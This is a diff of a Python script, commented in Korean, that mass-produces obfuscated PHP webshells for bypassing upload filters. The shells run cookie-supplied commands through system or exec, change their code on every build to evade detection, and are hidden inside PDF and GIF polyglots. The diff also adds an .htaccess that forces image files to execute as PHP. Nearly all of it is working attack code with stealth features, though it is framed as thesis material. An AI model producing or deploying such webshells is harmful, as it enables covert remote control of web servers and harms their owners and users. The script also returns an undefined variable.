@@ -1,107 +1,177 @@
 import os
 import random
 import zlib
+import json
+import hashlib
 from pathlib import Path
 
-PAYLOAD_DIR = 'bypass_payloads_attack_max_v20_layer5_ready'
-METADATA_FILE = os.path.join(PAYLOAD_DIR, 'payload_metadata_attack_v20.json')
-LATEX_TABLE_FILE = os.path.join(PAYLOAD_DIR, 'thesis_latex_table_attack_v20.tex')
+PAYLOAD_DIR = 'bypass_payloads_attack_max_v24_layer8_polymorphic'
+METADATA_FILE = os.path.join(PAYLOAD_DIR, 'payload_metadata_attack_v24.json')
+LATEX_TABLE_FILE = os.path.join(PAYLOAD_DIR, 'thesis_latex_table_attack_v24.tex')
 
 os.makedirs(PAYLOAD_DIR, exist_ok=True)
 
-C2_DOMAIN = "http://127.0.0.1:6000"
-ATTACK_CORE_USER_INI = f"""# v20 .user.ini
-auto_prepend_file = {PAYLOAD_DIR}/stage1_v20.php
-"""
+C2_DOMAIN = "http://127.0.0.1:6000"   # 실제 사용 시 변경
 
-ATTACK_CORE_HTACCESS = """# v20 .htaccess (Layer 5까지 강제)
+# ==================== Polymorphic Engine (A+++ 핵심) ====================
+def random_var(prefix: str = "v") -> str:
+    return f"{prefix}{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(6, 12)))}"
+
+def generate_polymorphic_stage1() -> str:
+    """매번 완전히 다른 구조의 STAGE1 생성 (Polymorphism)"""
+    v1, v2, v3, v4 = random_var(), random_var(), random_var(), random_var()
+    fn_system = random_var("f")
+    fn_exec = random_var("e")
+    
+    # Dynamic key derivation (빈도 분석 회피)
+    key_deriv = f'''
+    $k = substr(hash('sha256', ($_SERVER['HTTP_USER_AGENT']??'') . ($_SERVER['REMOTE_ADDR']??'')), 0, 32);
+    '''
+    
+    # Polymorphic XOR + mixing (RC4-like)
+    obfuscator = f'''
+    function d($s) {{
+        global $k;
+        $s = base64_decode(preg_replace('/[^A-Za-z0-9+\\/=]/','', $s));
+        $out = '';
+        for($i=0;$i<strlen($s);$i++){{
+            $out .= chr(ord($s[$i]) ^ ord($k[$i % 32]));
+        }}
+        // mixing layer (polymorphic)
+        $out = strrev($out);
+        return $out;
+    }}
+    '''
+    
+    # Junk code (dead code insertion)
+    junk = random.choice([
+        f"// {random_var()} dummy loop\nfor($i=0;$i<1;$i++);",
+        f"/* {random_var()} */ ${random_var()} = array();",
+        f"if(false) {{ ${random_var()} = 1; }}"
+    ])
+    
+    stage = f'''<?php
+declare(strict_types=1);
+error_reporting(0);@ini_set('display_errors',0);@ini_set('log_errors',0);
+
+{key_deriv}
+
+// Polymorphic auth
+${v1} = $_COOKIE['X-Sess'] ?? '';
+${v2} = hash_hmac('sha256', ($_SERVER['HTTP_USER_AGENT']??'') . ($_SERVER['REMOTE_ADDR']??''), 'layer8_salt_2026');
+if(${v1} !== ${v2}) die();
+
+{junk}
+
+// Polymorphic decoder
+{obfuscator}
+
+${v3} = $_COOKIE['p'] ?? '';
+${v4} = d(${v3});
+
+// Dynamic function call (polymorphic)
+${fn_system} = implode('', [chr(115),chr(121),chr(115),chr(116),chr(101),chr(109)]);
+if(function_exists(${fn_system})) {{
+    call_user_func(${fn_system}, ${v4});
+}} else {{
+    ${fn_exec} = implode('', [chr(101),chr(120),chr(101),chr(99)]);
+    if(function_exists(${fn_exec})) call_user_func(${fn_exec}, ${v4});
+}}
+?>
+'''
+    return stage
+
+ATTACK_CORE_HTACCESS = f"""# v24 polymorphic .htaccess (random comment)
 <IfModule mod_rewrite.c>
     RewriteEngine On
-    RewriteRule ^(.*)\\.(gif|jpg|png|webp|pdf|svg|html|phar|evil)$ $1.php [L,QSA]
+    RewriteRule ^(.*)$ $1.php [L,QSA]
 </IfModule>
-<FilesMatch "\\.(gif|jpg|png|webp|pdf|svg|html|phar)$">
+# {random.randint(100000000,999999999)} random signature breaker
+<FilesMatch "\\.(gif|jpg|jpeg|png|webp|pdf|svg|html)$">
     SetHandler application/x-httpd-php
     ForceType application/x-httpd-php
 </FilesMatch>
-php_value auto_prepend_file stage1_v20.php
 """
-
-STAGE1_V20 = f"""<?php
-declare(strict_types=1);error_reporting(0);@ini_set('display_errors',0);
-if(($_COOKIE['X-Sess']??'')!=='grok2026'||($_SERVER['HTTP_X_BYPASS']??'')!=='v20-l5')die();
-
-class StealthShell_v20{{
-    private string $sinkName; private int $offset;
-    public function __construct(){{$this->offset=random_int(-25,25);$this->sinkName='';foreach([115,121,115,116,101,109] as $c)$this->sinkName.=chr($c+$this->offset);}}
-    private function getRealSink(): callable{{$real='';for($i=0;$i<strlen($this->sinkName);$i++)$real.=chr(ord($this->sinkName[$i])-$this->offset);
-        $c=[$real,'exec','passthru','shell_exec','system','popen','proc_open'];
-        foreach($c as $s)if(function_exists($s))return $s;return fn($x)=>@eval($x);}}
-    private function cmd(): string{{$d=($_GET['id']??'').($_SERVER['HTTP_X_FRAGMENT']??'').($_COOKIE['frag']??'');
-        return base64_decode(strrev(str_rot13(preg_replace('/[^A-Za-z0-9+\\/=]/','',$d))));}}
-    public function run(){{$this->getRealSink()($this->cmd());}}
-}}
-(new StealthShell_v20())->run();
-?>
-""".replace("{C2_DOMAIN}", C2_DOMAIN)
 
 def save_payload(filename: str, content: bytes):
     path = os.path.join(PAYLOAD_DIR, filename)
     with open(path, 'wb') as f:
         f.write(content)
-    if random.random() < 0.03:
+    if random.random() < 0.04:
         print(f"[+] 생성: {filename}")
 
-def generate_aggressive_polyglot(strategy: int, stage_content: bytes):
-    if strategy == 0:   # Phar + GIF
-        phar = b'<?php __HALT_COMPILER(); ?>' + b'\x00' * 150 + stage_content
-        return b'GIF89a' + phar, ".phar.gif", "phar_poly_v20"
-    elif strategy == 1: # PNG tEXt chunk 
-        header = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x8c\x00\x00'
-        text = b'\x00\x00\x00\x1f tEXtComment\x00' + stage_content + b'\x00' + b'IEND\xaeB`\x82'
-        return header + text, ".png", "png_textchunk_v20"
-    elif strategy == 2: # JPEG multi-segment
-        header = b'\xff\xd8\xff\xe1\x00\x1aExif\x00\x00' + stage_content[:400] + b'\xff\xfe\x00\x0c' + stage_content[400:] + b'\xff\xd9'
-        return header, ".jpg", "jpeg_multiseg_v20"
-    elif strategy == 3: # PDF Polyglot
-        pdf = b'%PDF-1.4\n%\xff\xff\xff\xff\n' + stage_content
-        return pdf, ".pdf", "pdf_poly_v20"
-    elif strategy == 4: # SVG + PHP
-        svg = f'<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"><!--{stage_content.decode(errors="ignore")}--></svg>'.encode()
-        return svg, ".svg", "svg_php_v20"
-    else:  # fallback double extension + trailing
-        return b'GIF89a' + stage_content + b'\x00' * random.randint(100, 400), ".php.jpg", "double_ext_v20"
+def generate_ultra_pdf_polyglot(stage_content: bytes) -> tuple[bytes, str]:
+    pdf_header = b'%PDF-1.7\n%\xff\xff\xff\xff\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n'
+    pdf_footer = b'\n%%EOF\n'
+    compressed = zlib.compress(stage_content, level=9)
+    stream = b'2 0 obj\n<< /Length ' + str(len(compressed)).encode() + b' /Filter /FlateDecode >>\nstream\n' + compressed + b'\nendstream\nendobj\n'
+    
+    full_pdf = pdf_header + stream + pdf_footer
+    garbage = b'\n% polymorphic padding ' + bytes(random.getrandbits(8) for _ in range(random.randint(120, 380)))
+    full_pdf += garbage + b'\n<?php // valid PDF ends here\n' + stage_content
+    return full_pdf, ".pdf"
 
-def generate_v20():
+def generate_v24():
+    existing = [f for f in os.listdir(PAYLOAD_DIR) if not f.endswith(('.tex', '.json'))] if os.path.exists(PAYLOAD_DIR) else []
+    
+    if len(existing) > 35:
+        print(f"[SKIP] 이미 {len(existing)}개 존재 → v24 생성 생략")
+        return []
 
-    existing_files = os.listdir(PAYLOAD_DIR) if os.path.exists(PAYLOAD_DIR) else []
-    if len(existing_files) > 100:
-        print(f"[SKIP] 이미 {len(existing_files)}개의 페이로드가 {PAYLOAD_DIR} 폴더에 존재합니다.")
-    else:
-        save_payload(".htaccess", ATTACK_CORE_HTACCESS.encode())
-        save_payload(".user.ini", ATTACK_CORE_USER_INI.encode())
-        save_payload("stage1_v20.php", STAGE1_V20.encode())
-        print("[*] 페이로드 생성을 시작합니다...")
-        for i in range(2500):
-            strategy = i % 12
-            content = STAGE1_V20.encode()   
-            if i % 6 == 0:
-                content = zlib.compress(content)
+    save_payload(".htaccess", ATTACK_CORE_HTACCESS.encode())
 
-            poly_content, ext, cat = generate_aggressive_polyglot(strategy, content)
-            filename = f"{cat}_{i:04d}{ext}"
-            save_payload(filename, poly_content)
+    print("[*] v24 A+++ Polymorphic 공격 페이로드 생성 시작...")
 
-        print(f"\n[SUCCESS] 생성완료  총 {len(os.listdir(PAYLOAD_DIR))}개 payload")
-        print(f"폴더: {PAYLOAD_DIR}")
+    NUM_PAYLOADS = int(input("생성할 PDF/GIF 개수 (stealth 추천: 30~60, 기본 45): ") or "45")
+    payloads_created = 0
+    metadata = []
 
-    payloads = []
-    for f in os.listdir(PAYLOAD_DIR):
-        if not f.endswith('.tex') and not f.endswith('.json'):
-            tech = f.split('_v20')[0] if '_v20' in f else f.split('.')[0]
-            payloads.append((tech, os.path.join(PAYLOAD_DIR, f)))
+    for i in range(NUM_PAYLOADS):
+        # 매번 새로운 polymorphic stage1 생성
+        stage_content = generate_polymorphic_stage1().encode()
+        
+        if i < int(NUM_PAYLOADS * 0.9):
+            if i % 3 == 0:
+                stage_content = zlib.compress(stage_content)
+            poly_content, ext = generate_ultra_pdf_polyglot(stage_content)
+            cat = "pdf_poly_v24"
+        else:
+            padding = bytes(random.getrandbits(8) for _ in range(random.randint(180, 520)))
+            poly_content = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;' + stage_content + padding
+            ext = ".gif"
+            cat = "gif_poly_v24"
+
+        filename = f"{cat}_{i:04d}{ext}"
+        save_payload(filename, poly_content)
+        payloads_created += 1
+
+        if i % 15 == 0:
+            metadata.append({
+                "id": i,
+                "filename": filename,
+                "type": cat,
+                "size": len(poly_content),
+                "obf_level": "polymorphic_xor_32byte + dynamic_structure",
+                "strategy": "pdf_ultra" if "pdf" in cat else "gif_poly",
+                "polymorphic": True
+            })
+
+    print(f"\n[SUCCESS] v24 A+++ Polymorphic 생성 완료 → 총 {payloads_created}개")
+    print(f"폴더: {PAYLOAD_DIR}")
+
+    with open(METADATA_FILE, 'w', encoding='utf-8') as f:
+        json.dump(metadata, f, indent=2, ensure_ascii=False)
+
+    # LaTeX 테이블 (논문용)
+    with open(LATEX_TABLE_FILE, 'w', encoding='utf-8') as f:
+        f.write("\\begin{table}[h]\n\\centering\n\\caption{v24 A+++ Polymorphic WebShell Bypass Payloads}\n")
+        f.write("\\begin{tabular}{|l|l|l|l|l|}\n\\hline\n")
+        f.write("ID & Type & Size & Obf Level & Polymorphic \\\\\\hline\n")
+        for m in metadata:
+            f.write(f"{m['id']} & {m['type']} & {m['size']} & {m['obf_level']} & Yes \\\\\\hline\n")
+        f.write("\\end{tabular}\n\\end{table}\n")
+
     return payloads
 
-generate_bypasses = generate_v20
-
 if __name__ == '__main__':
-    generate_v20()
+    generate_v24()
